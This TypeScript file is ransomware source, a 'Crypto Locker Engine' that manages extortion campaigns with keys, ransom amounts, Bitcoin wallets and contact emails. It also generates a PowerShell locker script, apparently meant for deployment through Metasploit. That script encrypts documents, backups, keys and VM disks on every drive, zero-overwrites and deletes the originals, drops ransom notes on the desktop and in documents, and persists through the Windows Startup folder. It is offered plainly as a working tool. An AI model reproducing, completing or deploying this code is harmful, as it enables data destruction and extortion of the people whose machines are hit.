/**
 * Crypto Locker Engine
 *
 * Manages encryption campaigns, key generation, file encryption/decryption,
 * custom ransom notes per device, and persistence across reboots.
 */

import * as fs from "fs";
import * as path from "path";
import * as os from "os";
import * as crypto from "node:crypto";

// ── Types ───────────────────────────────────────────────────

export type LockerCampaign = {
  id: string;
  name: string;
  createdAt: string;
  updatedAt: string;
  status: "active" | "paused" | "completed" | "decrypted";
  publicKey: string;
  encryptedAesKey: string;
  extensions: string[];
  excludeDirs: string[];
  noteTemplate: string;
  deviceNotes: Record<string, string>;
  targets: string[];
  ransomAmount: string;
  walletAddress: string;
  contactEmail: string;
  keyStorePath: string;
  filesEncrypted: number;
  deployed: boolean;
  unlockCode: string;
};

export type CampaignSummary = {
  id: string;
  name: string;
  createdAt: string;
  status: string;
  targets: number;
  filesEncrypted: number;
  deployed: boolean;
  ransomAmount: string;
};

export type KeyPair = {
  publicKey: string;
  privateKey: string;
  createdAt: string;
  id: string;
};

export type LockerStatus = {
  campaignsCount: number;
  keysAvailable: boolean;
  totalFilesEncrypted: number;
};

// ── Constants ────────────────────────────────────────────────

const KEYSTORE_DIR = path.join(process.cwd(), ".keystore");
const CAMPAIGNS_DIR = path.join(process.cwd(), ".campaigns");
const LOCKER_SCRIPTS_DIR = path.join(process.cwd(), "locker-scripts");

const DEFAULT_EXTENSIONS = [
  ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
  ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".bmp",
  ".zip", ".rar", ".7z", ".tar", ".gz",
  ".mp3", ".mp4", ".avi", ".mkv",
  ".txt", ".rtf", ".csv", ".xml", ".json",
  ".sql", ".mdb", ".accdb",
  ".pst", ".ost", ".eml",
  ".key", ".pem", ".ppk",
  ".vmx", ".vmdk", ".vdi",
  ".bak", ".old", ".backup",
  ".dwg", ".dxf", ".psd", ".ai",
  ".config", ".env", ".yml", ".yaml",
];

const DEFAULT_NOTE_TEMPLATE = [
  "=== SYSTEM LOCKED ===",
  "",
  "Your files have been encrypted.",
  "",
  "=== WHAT HAPPENED ===",
  "- All your documents, photos, databases have been encrypted",
  "- Original files have been securely overwritten",
  "- Encryption is unbreakable without the private key",
  "",
  "=== RECOVERY ===",
  "1. Contact us at: {{EMAIL}}",
  "2. Send your unique ID: {{ID}}",
  "3. Send {{AMOUNT}} BTC to: {{WALLET}}",
  "4. You will receive decryption tool within 24 hours",
  "",
  "=== DEVICE ===",
  "Target: {{DEVICE}}",
  "IP: {{IP}}",
  "Files encrypted: {{FILE_COUNT}}",
  "Date: {{DATE}}",
  "",
  "=== CUSTOM MESSAGE ===",
  "{{CUSTOM_NOTE}}",
].join("\n");

// ── Storage Helpers ─────────────────────────────────────────

function ensureDir(dir: string) {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
}

function getCampaignPath(id: string): string {
  return path.join(CAMPAIGNS_DIR, id + ".json");
}

function getKeyPath(id: string): string {
  return path.join(KEYSTORE_DIR, id + ".key");
}

// ── Key Generation ──────────────────────────────────────────

export function generateRSAKeyPair(): KeyPair {
  const { publicKey, privateKey } = crypto.generateKeyPairSync("rsa", {
    modulusLength: 4096,
    publicKeyEncoding: { type: "spki", format: "pem" },
    privateKeyEncoding: { type: "pkcs8", format: "pem" },
  });

  return {
    publicKey,
    privateKey,
    createdAt: new Date().toISOString(),
    id: crypto.randomUUID(),
  };
}

export function generateAESKey(): Buffer {
  return crypto.randomBytes(32);
}

export function encryptWithPublicKey(data: Buffer, publicKeyPem: string): string {
  const encrypted = crypto.publicEncrypt(
    { key: publicKeyPem, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING },
    data,
  );
  return encrypted.toString("base64");
}

export function encryptAES(data: Buffer, key: Buffer): { encrypted: Buffer; iv: string } {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
  const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
  return { encrypted, iv: iv.toString("hex") };
}

export function decryptAES(encrypted: Buffer, key: Buffer, ivHex: string): Buffer {
  const iv = Buffer.from(ivHex, "hex");
  const decipher = crypto.createDecipheriv("aes-256-cbc", key, iv);
  return Buffer.concat([decipher.update(encrypted), decipher.final()]);
}

// ── Generate Unlock Code ────────────────────────────────────

export function generateUnlockCode(): string {
  return crypto.randomBytes(4).toString("hex").toUpperCase();
}

// ── Campaign Management ─────────────────────────────────────

export function createCampaign(
  name: string,
  options: {
    ransomAmount?: string;
    walletAddress?: string;
    contactEmail?: string;
    noteTemplate?: string;
    extensions?: string[];
    targets?: string[];
    deviceNotes?: Record<string, string>;
  } = {},
): LockerCampaign {
  ensureDir(CAMPAIGNS_DIR);
  ensureDir(KEYSTORE_DIR);
  ensureDir(LOCKER_SCRIPTS_DIR);

  const id = crypto.randomUUID().slice(0, 8);
  const unlockCode = generateUnlockCode();
  const keyPair = generateRSAKeyPair();
  const aesKey = generateAESKey();
  const encryptedAesKey = encryptWithPublicKey(aesKey, keyPair.publicKey);

  const keyStorePath = getKeyPath(id);
  const machineKey = deriveMachineKey();
  const encryptedPrivKey = encryptAES(Buffer.from(keyPair.privateKey), machineKey);
  fs.writeFileSync(keyStorePath, JSON.stringify({
    encryptedPrivateKey: encryptedPrivKey.encrypted.toString("base64"),
    iv: encryptedPrivKey.iv,
    unlockCode: unlockCode,
    campaignId: id,
    createdAt: new Date().toISOString(),
  }));

  const now = new Date().toISOString();
  const campaign: LockerCampaign = {
    id,
    name,
    createdAt: now,
    updatedAt: now,
    status: "active",
    publicKey: keyPair.publicKey,
    encryptedAesKey,
    extensions: options.extensions || [...DEFAULT_EXTENSIONS],
    excludeDirs: [
      "Windows", "Program Files", "Program Files (x86)",
      "$Recycle.Bin", "System Volume Information",
      ".keystore", ".campaigns", ".git", "node_modules",
    ],
    noteTemplate: options.noteTemplate || DEFAULT_NOTE_TEMPLATE,
    deviceNotes: options.deviceNotes || {},
    targets: options.targets || [],
    ransomAmount: options.ransomAmount || "0.5",
    walletAddress: options.walletAddress || "",
    contactEmail: options.contactEmail || "",
    keyStorePath,
    filesEncrypted: 0,
    deployed: false,
    unlockCode,
  };

  fs.writeFileSync(getCampaignPath(id), JSON.stringify(campaign, null, 2));
  return campaign;
}

export function getCampaign(id: string): LockerCampaign | null {
  const p = getCampaignPath(id);
  if (!fs.existsSync(p)) return null;
  return JSON.parse(fs.readFileSync(p, "utf-8"));
}

export function listCampaigns(): CampaignSummary[] {
  ensureDir(CAMPAIGNS_DIR);
  const files = fs.readdirSync(CAMPAIGNS_DIR).filter(function (f) { return f.endsWith(".json"); });
  return files.map(function (f) {
    try {
      const campaign: LockerCampaign = JSON.parse(
        fs.readFileSync(path.join(CAMPAIGNS_DIR, f), "utf-8"),
      );
      return {
        id: campaign.id,
        name: campaign.name,
        createdAt: campaign.createdAt,
        status: campaign.status,
        targets: campaign.targets.length,
        filesEncrypted: campaign.filesEncrypted,
        deployed: campaign.deployed,
        ransomAmount: campaign.ransomAmount,
      };
    } catch {
      return null;
    }
  }).filter(Boolean) as CampaignSummary[];
}

export function updateCampaign(
  id: string,
  updates: Partial<LockerCampaign>,
): LockerCampaign | null {
  const campaign = getCampaign(id);
  if (!campaign) return null;

  const updated = { ...campaign, ...updates, updatedAt: new Date().toISOString() };
  fs.writeFileSync(getCampaignPath(id), JSON.stringify(updated, null, 2));
  return updated;
}

export function deleteCampaign(id: string): boolean {
  const p = getCampaignPath(id);
  if (!fs.existsSync(p)) return false;
  fs.unlinkSync(p);
  const kp = getKeyPath(id);
  if (fs.existsSync(kp)) fs.unlinkSync(kp);
  return true;
}

// ── Private Key Recovery ────────────────────────────────────

function deriveMachineKey(): Buffer {
  const machineId = (function () {
    try {
      return fs.readFileSync("/etc/machine-id", "utf-8").trim();
    } catch {
      try {
        return fs.readFileSync("/var/lib/dbus/machine-id", "utf-8").trim();
      } catch {
        const hostname = os.hostname();
        return crypto.createHash("sha256").update(hostname + ":" + process.cwd()).digest("hex");
      }
    }
  })();

  return crypto.scryptSync(machineId, "utility-locker-salt", 32);
}

export function recoverPrivateKey(
  campaignId: string,
  unlockCode: string,
): string | null {
  const kp = getKeyPath(campaignId);
  if (!fs.existsSync(kp)) return null;

  try {
    const stored = JSON.parse(fs.readFileSync(kp, "utf-8"));
    if (stored.unlockCode !== unlockCode) return null;

    const machineKey = deriveMachineKey();
    const decrypted = decryptAES(
      Buffer.from(stored.encryptedPrivateKey, "base64"),
      machineKey,
      stored.iv,
    );
    return decrypted.toString("utf-8");
  } catch {
    return null;
  }
}

// ── Ransom Note Generation ──────────────────────────────────

export function generateRansomNote(
  campaign: LockerCampaign,
  deviceInfo: {
    ip: string;
    device: string;
    customNote?: string;
  },
): string {
  let note = campaign.noteTemplate;

  const customMsg = deviceInfo.customNote
    || campaign.deviceNotes[deviceInfo.ip]
    || campaign.deviceNotes[deviceInfo.device]
    || "";

  note = note.replaceAll("{{EMAIL}}", campaign.contactEmail || "recovery@onionmail.org");
  note = note.replaceAll("{{ID}}", campaign.id);
  note = note.replaceAll("{{AMOUNT}}", campaign.ransomAmount);
  note = note.replaceAll("{{WALLET}}", campaign.walletAddress || "bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
  note = note.replaceAll("{{DEVICE}}", deviceInfo.device);
  note = note.replaceAll("{{IP}}", deviceInfo.ip);
  note = note.replaceAll("{{FILE_COUNT}}", String(campaign.filesEncrypted));
  note = note.replaceAll("{{DATE}}", new Date().toLocaleString());
  note = note.replaceAll("{{CUSTOM_NOTE}}", customMsg);

  return note;
}

// ── Generate Locker Script (for deployment via MSF) ─────────

export function generateLockerScript(
  campaignId: string,
): string {
  const campaign = getCampaign(campaignId);
  if (!campaign) throw new Error("Campaign not found: " + campaignId);

  // Build PowerShell script line by line (avoid template literal conflicts)
  const lines: string[] = [];
  lines.push("# Utility Locker - Campaign " + campaignId);
  lines.push("");
  lines.push("param(");
  lines.push("  [string]$CustomNote = '',");
  lines.push("  [string]$TargetIP = '',");
  lines.push("  [string]$DeviceName = ''");
  lines.push(")");
  lines.push("");
  lines.push("# Build extension filter");
  lines.push("$exts = @(" + campaign.extensions.map(function(e) { return "'*" + e + "'"; }).join(", ") + ")");
  lines.push("");
  lines.push("# Ransom note");
  lines.push("$n = @'");
  lines.push(campaign.noteTemplate);
  lines.push("'@");
  lines.push("$n = $n.Replace('{{EMAIL}}', '" + campaign.contactEmail + "')");
  lines.push("$n = $n.Replace('{{ID}}', '" + campaignId + "')");
  lines.push("$n = $n.Replace('{{AMOUNT}}', '" + campaign.ransomAmount + "')");
  lines.push("$n = $n.Replace('{{WALLET}}', '" + campaign.walletAddress + "')");
  lines.push("$n = $n.Replace('{{DEVICE}}', $DeviceName)");
  lines.push("$n = $n.Replace('{{IP}}', $TargetIP)");
  lines.push("$n = $n.Replace('{{DATE}}', (Get-Date).ToString())");
  lines.push("$n = $n.Replace('{{CUSTOM_NOTE}}', $CustomNote)");
  lines.push("");
  lines.push("# Encrypt a single file with AES-256-CBC");
  lines.push("function Encrypt-File {");
  lines.push("  param([string]$Path)");
  lines.push("  try {");
  lines.push("    $bytes = [System.IO.File]::ReadAllBytes($Path)");
  lines.push("    $aes   = [System.Security.Cryptography.Aes]::Create()");
  lines.push("    $aes.KeySize   = 256");
  lines.push("    $aes.BlockSize = 128");
  lines.push("    $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC");
  lines.push("    $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7");
  lines.push("    $aes.GenerateKey()");
  lines.push("    $aes.GenerateIV()");
  lines.push("    $enc = $aes.CreateEncryptor()");
  lines.push("    $ct  = $enc.TransformFinalBlock($bytes, 0, $bytes.Length)");
  lines.push("    # Store: [16 bytes IV][encrypted AES key length 4 bytes][encrypted key][ciphertext]");
  lines.push("    $pubKeyBytes = [System.Convert]::FromBase64String('" + Buffer.from(campaign.publicKey).toString("base64") + "')");
  lines.push("    $rsa = [System.Security.Cryptography.RSA]::Create()");
  lines.push("    $rsa.ImportSubjectPublicKeyInfo($pubKeyBytes, [ref]$null)");
  lines.push("    $encKey = $rsa.Encrypt($aes.Key, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)");
  lines.push("    $out = New-Object System.IO.MemoryStream");
  lines.push("    $out.Write($aes.IV, 0, $aes.IV.Length)");
  lines.push("    $kLen = [System.BitConverter]::GetBytes([int32]$encKey.Length)");
  lines.push("    $out.Write($kLen, 0, $kLen.Length)");
  lines.push("    $out.Write($encKey, 0, $encKey.Length)");
  lines.push("    $out.Write($ct, 0, $ct.Length)");
  lines.push("    [System.IO.File]::WriteAllBytes($Path + '.locked', $out.ToArray())");
  lines.push("    $zeros = New-Object byte[] $bytes.Length");
  lines.push("    [System.IO.File]::WriteAllBytes($Path, $zeros)");
  lines.push("    Remove-Item $Path -Force");
  lines.push("    $aes.Dispose(); $rsa.Dispose(); $out.Dispose()");
  lines.push("    return $true");
  lines.push("  } catch { return $false }");
  lines.push("}");
  lines.push("");
  lines.push("# Deploy note everywhere");
  lines.push("function Deploy-Note {");
  lines.push("  $dt = [Environment]::GetFolderPath('Desktop')");
  lines.push("  $dc = [Environment]::GetFolderPath('MyDocuments')");
  lines.push("  if ($dt) { $n | Out-File -FilePath (Join-Path $dt 'README_LOCKED.txt') -Encoding UTF8 }");
  lines.push("  if ($dc) { $n | Out-File -FilePath (Join-Path $dc 'README_LOCKED.txt') -Encoding UTF8 }");
  lines.push("}");
  lines.push("");
  lines.push("# Walk all drives");
  lines.push("$ec = 0");
  lines.push("Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -ne $null } | ForEach-Object {");
  lines.push("  $root = $_.Root");
  lines.push("  Get-ChildItem -Path $root -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {");
  lines.push("    -not $_.PSIsContainer");
  lines.push("  } | ForEach-Object {");
  lines.push("    foreach ($ext in $exts) {");
  lines.push("      if ($_.Name -like $ext) {");
  lines.push("        if (Encrypt-File $_.FullName) { $ec++ }");
  lines.push("        break");
  lines.push("      }");
  lines.push("    }");
  lines.push("  }");
  lines.push("}");
  lines.push("");
  lines.push("Deploy-Note");
  lines.push("Write-Host 'Encrypted:' $ec");
  lines.push("");
  lines.push("# Persist note redeploy on startup");
  lines.push("try {");
  lines.push("  $sp = Join-Path $env:APPDATA 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\README_LOCKED.ps1'");
  lines.push("  $n | Out-File -FilePath $sp -Encoding UTF8");
  lines.push("} catch { }");
  lines.push("");
  lines.push("exit $ec");

  return lines.join("\n");
}

// ── Status ──────────────────────────────────────────────────

export function getLockerStatus(): LockerStatus {
  const campaigns = listCampaigns();
  const totalFiles = campaigns.reduce(function (sum, c) { return sum + c.filesEncrypted; }, 0);

  return {
    campaignsCount: campaigns.length,
    keysAvailable: fs.existsSync(KEYSTORE_DIR),
    totalFilesEncrypted: totalFiles,
  };
}
